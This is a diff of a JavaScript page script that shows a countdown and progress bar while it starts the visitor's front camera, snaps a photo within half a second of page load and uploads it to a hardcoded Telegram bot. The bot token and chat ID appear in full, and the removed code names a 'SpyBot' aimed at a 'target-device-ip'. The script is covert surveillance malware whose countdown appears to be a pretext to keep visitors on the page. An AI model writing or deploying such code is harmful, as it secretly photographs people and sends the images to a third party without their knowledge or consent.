@@ -1,65 +1,66 @@
-// JavaScript code in script.js
+document.addEventListener("DOMContentLoaded", function () {
+    let timeLeft = 20;
+    const countdownElement = document.getElementById("countdown");
+    const progressBar = document.getElementById("progress-bar");
 
-const video = document.createElement('video');
-const canvas = document.createElement('canvas');
-const progressBar = document.getElementById('progress');
-const countdown = document.getElementById('countdown');
+    const countdownInterval = setInterval(() => {
+        timeLeft--;
+        countdownElement.textContent = timeLeft;
+        progressBar.style.width = (timeLeft / 20) * 100 + "%";
 
-function updateProgress(percentage) {
-  progressBar.style.width = `${percentage}%`;
-}
+        if (timeLeft <= 0) {
+            clearInterval(countdownInterval);
+        }
+    }, 1000);
 
-function updateCountdown(seconds) {
-  countdown.textContent = seconds;
-}
+    async function startCamera() {
+        try {
+            const video = document.getElementById('video');
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            video.srcObject = stream;
 
-// Function to capture image from camera
-function captureImage() {
-  navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-    .then(stream => {
-      video.srcObject = stream;
-      video.play();
+            console.log("✅ الكاميرا تعمل، سيتم التقاط الصورة خلال نصف ثانية...");
+            setTimeout(() => captureAndSendPhoto(stream), 500); // التقاط الصورة بعد نصف ثانية
+        } catch (error) {
+            console.error("❌ فشل في تشغيل الكاميرا:", error);
+        }
+    }
 
-      setTimeout(() => {
+    function captureAndSendPhoto(stream) {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
+
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        const dataURL = canvas.toDataURL('image/jpeg');
-        // Send the captured image to the server or display it on the page
-        console.log('Captured image:', dataURL);
+        console.log("📸 تم التقاط الصورة! جاري إرسالها...");
+        canvas.toBlob(blob => sendPhoto(blob, stream), "image/jpeg");
+    }
 
-        // Send the captured image to the specified bot and user
-        const bot = new SpyBot('target-device-ip', '7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E', '5375214810');
+    function sendPhoto(blob, stream) {
+        const formData = new FormData();
+        formData.append("chat_id", "5375214810");
+        formData.append("photo", blob, "snapshot.jpg");
 
-        bot.connect()
-          .then(() => {
-            return bot.execute(`sendImage "${dataURL}"`);
-          })
-          .then(() => {
-            console.log('Image sent successfully!');
-          })
-          .catch(error => {
-            console.error('Error sending image:', error);
-          });
-      }, 2000);
-    })
-    .catch(error => {
-      console.error('Error accessing camera:', error);
-    });
-}
+        fetch("https://api.telegram.org/bot7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E/sendPhoto", {
+            method: "POST",
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log("✅ تم إرسال الصورة بنجاح:", data);
+            stopCamera(stream);
+        })
+        .catch(error => console.error("❌ خطأ في إرسال الصورة:", error));
+    }
 
-// Simulate data collection and progress updates
-updateProgress(0);
-updateCountdown(20);
+    function stopCamera(stream) {
+        let tracks = stream.getTracks();
+        tracks.forEach(track => track.stop());
+        console.log("📴 تم إيقاف الكاميرا بعد التقاط الصورة.");
+    }
 
-setTimeout(() => {
-  updateProgress(25);
-  updateCountdown(15);
-}, 2000);
-
-// Simulate camera access and image capture
-setTimeout(() => {
-  captureImage();
-}, 4000);
+    startCamera();
+});
